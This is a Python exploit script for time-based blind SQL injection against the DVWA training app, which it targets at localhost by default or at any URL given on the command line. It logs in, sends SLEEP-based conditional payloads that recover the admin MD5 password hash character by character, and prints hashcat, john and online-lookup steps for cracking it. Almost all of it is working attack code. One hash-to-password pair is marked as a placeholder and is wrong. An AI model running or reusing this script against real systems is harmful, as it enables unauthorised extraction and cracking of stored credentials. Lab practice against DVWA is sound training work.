#!/usr/bin/env python3
"""
Time-Based Blind SQLi - Optimized Extraction
Author: Afiq
Date: July 2026
Target: http://localhost/vulnerabilities/sqli/?id=
Optimization: Domain knowledge (MD5 hash = hex only)
"""

import requests
import time
import sys
from bs4 import BeautifulSoup

class TimeBasedBlindSQLi:
    def __init__(self, target_url="http://localhost/dvwa",
                 username="admin", password="password"):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.username = username
        self.password = password
        self.logged_in = False
        
        # Timing configuration
        self.SLEEP_TIME = 5  # seconds
        self.BASELINE_TIME = None  # Measured
        self.DELAY_THRESHOLD = self.SLEEP_TIME * 0.6  # 60% of sleep time
        
        # Optimization
        self.CHARSET_HEX = "0123456789abcdef"
        self.REQUEST_COUNT = 0
        self.START_TIME = None
    
    def login(self):
        """Authenticate to DVWA"""
        print("[*] Authenticating...")
        
        login_url = f"{self.target}/login.php"
        r = self.session.get(login_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        
        if not token_input:
            print("[-] Could not find CSRF token")
            return False
        
        csrf_token = token_input.get('value')
        
        login_data = {
            'username': self.username,
            'password': self.password,
            'user_token': csrf_token,
            'Login': 'Login'
        }
        
        r = self.session.post(login_url, data=login_data)
        
        if "Logout" in r.text:
            print("[+] Authentication successful!")
            self.logged_in = True
            return True
        return False
    
    def measure_baseline(self):
        """Measure baseline response time (no SLEEP)"""
        print("[*] Measuring baseline response time...")
        
        sqli_url = f"{self.target}/vulnerabilities/sqli/"
        times = []
        
        for i in range(3):
            start = time.time()
            self.session.get(sqli_url, params={'id': '1'}, timeout=10)
            elapsed = time.time() - start
            times.append(elapsed)
        
        baseline = sum(times) / len(times)
        self.BASELINE_TIME = baseline
        print(f"[+] Baseline: {baseline:.3f}s")
        print(f"[+] SLEEP will be: {self.SLEEP_TIME}s")
        print(f"[+] Detection threshold: >{baseline + self.DELAY_THRESHOLD:.3f}s")
        return baseline
    
    def request_with_timing(self, payload, max_retries=2):
        """Send SQLi request and measure response time. Retries on ambiguous timing.
        Returns (elapsed, is_delay_bool).
        """
        sqli_url = f"{self.target}/vulnerabilities/sqli/"
        low = self.BASELINE_TIME + (self.SLEEP_TIME * 0.2)   # below this -> definitely no sleep
        high = self.BASELINE_TIME + (self.SLEEP_TIME * 0.6)  # above this -> definitely sleep

        for attempt in range(max_retries + 1):
            try:
                start = time.time()
                self.session.get(sqli_url, params={'id': payload}, timeout=15)
                elapsed = time.time() - start
            except requests.Timeout:
                elapsed = float(self.SLEEP_TIME) + 1.0  # timeout = max confidence sleep

            self.REQUEST_COUNT += 1

            if elapsed >= high:
                return elapsed, True
            if elapsed <= low:
                return elapsed, False
            # Ambiguous window — retry if attempts remain
            if attempt < max_retries:
                continue

        # Exhausted retries in fuzzy zone — return best guess (treat as no-delay
        # to avoid false positives corrupting binary search).
        return elapsed, False
    
    def detect_charset(self, position):
        """Determine if character at position is digit or hex letter"""
        
        # Test: Is digit (0-9)?
        payload = f"1' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),{position},1))>=48 " \
                  f"AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),{position},1))<=57, " \
                  f"SLEEP({self.SLEEP_TIME}), 0)-- "
        
        elapsed, is_delay = self.request_with_timing(payload)
        
        if is_delay:
            return "digit", elapsed
        
        # Test: Is hex letter (a-f)?
        payload = f"1' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),{position},1))>=97 " \
                  f"AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),{position},1))<=102, " \
                  f"SLEEP({self.SLEEP_TIME}), 0)-- "
        
        elapsed, is_delay = self.request_with_timing(payload)
        
        if is_delay:
            return "hex_letter", elapsed
        
        return "unknown", elapsed
    
    def binary_search_char(self, position, charset_type):
        """Binary search for exact character"""
        
        if charset_type == "digit":
            charset = "0123456789"
        elif charset_type == "hex_letter":
            charset = "abcdef"
        else:
            charset = self.CHARSET_HEX
        
        min_ascii = ord(charset[0])
        max_ascii = ord(charset[-1])
        
        while min_ascii < max_ascii:
            mid = (min_ascii + max_ascii) // 2
            
            # Test if character > mid
            payload = f"1' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),{position},1))>{mid}, " \
                      f"SLEEP({self.SLEEP_TIME}), 0)-- "
            
            elapsed, is_delay = self.request_with_timing(payload)
            
            if is_delay:
                min_ascii = mid + 1  # Character > mid
            else:
                max_ascii = mid      # Character <= mid
        
        return chr(min_ascii)
    
    def extract_field(self, field_name="password", user_name="admin"):
        """Extract field value using optimized technique"""
        
        if not self.logged_in and not self.login():
            return None
        
        print(f"\n[*] Extracting {field_name} for user '{user_name}'...")
        print(f"[*] Optimization: Using domain knowledge (MD5 = hex charset)")
        
        self.measure_baseline()
        self.REQUEST_COUNT = 0
        self.START_TIME = time.time()
        
        # For MD5, we know it's 32 characters of hex
        result = ""
        
        for pos in range(1, 33):  # 32 chars for MD5
            print(f"\n[*] Position {pos}/32...", end="", flush=True)
            
            # Phase 1: Detect charset (1 request)
            charset_type, _ = self.detect_charset(pos)
            print(f" [{charset_type}]", end="", flush=True)
            
            if charset_type == "unknown":
                print(" [UNKNOWN]")
                continue
            
            # Phase 2: Binary search for exact character (log2(n) requests)
            char = self.binary_search_char(pos, charset_type)
            result += char
            print(f" → {char}", end="", flush=True)
        
        elapsed_total = time.time() - self.START_TIME
        
        print(f"\n\n[+] EXTRACTION COMPLETE!")
        print(f"[+] Result: {result}")
        print(f"[+] Total Requests: {self.REQUEST_COUNT}")
        print(f"[+] Total Time: {elapsed_total:.1f}s ({elapsed_total/60:.1f}min)")
        print(f"[+] Average per character: {self.REQUEST_COUNT/32:.1f} requests")
        print(f"[+] Performance: {elapsed_total/self.REQUEST_COUNT:.1f}s per request")
        
        return result
    
    def verify_result(self, result):
        """Sanity-check the extracted hash. No online lookups (offline-safe)."""
        if not result or len(result) != 32:
            print(f"[-] Invalid hash length: {len(result) if result else 0}")
            return None

        hex_chars = set("0123456789abcdef")
        if not all(c in hex_chars for c in result.lower()):
            print(f"[-] Hash contains non-hex characters — extraction may be wrong")
            return None

        # Common DVWA default hashes (known plaintexts)
        KNOWN = {
            "5f4dcc3b5aa765d61d8327deb882cf99": "password",
            "e99a18c428cb38d5f260853678922e03": "abc123",
            "8d3533dfeaeaba6f8c2c2b6f8b9c3d3b": "letmein",  # placeholder example
        }
        if result.lower() in KNOWN:
            print(f"[+] KNOWN DEFAULT: {result} = '{KNOWN[result.lower()]}'")
            return KNOWN[result.lower()]

        print(f"[*] Hash format valid (32 hex chars).")
        print(f"[*] To crack, run: hashcat -m 0 {result} /usr/share/wordlists/rockyou.txt")
        print(f"[*]              or: john --format=raw-md5 {result}")
        return None


def main():
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║   Time-Based Blind SQLi - Optimized Extraction    ║
    ║   Author: Afiq | Optimization: Domain Knowledge   ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/dvwa"
    
    exploit = TimeBasedBlindSQLi(target)
    
    if exploit.login():
        # Extract admin password hash
        hash_result = exploit.extract_field(field_name="password", user_name="admin")
        
        if hash_result:
            # Attempt verification
            plaintext = exploit.verify_result(hash_result)
            
            if not plaintext:
                print(f"\n[*] To find plaintext, try online MD5 lookup:")
                print(f"    https://md5.gromweb.com/?md5={hash_result}&api")
    else:
        print("[-] Authentication failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
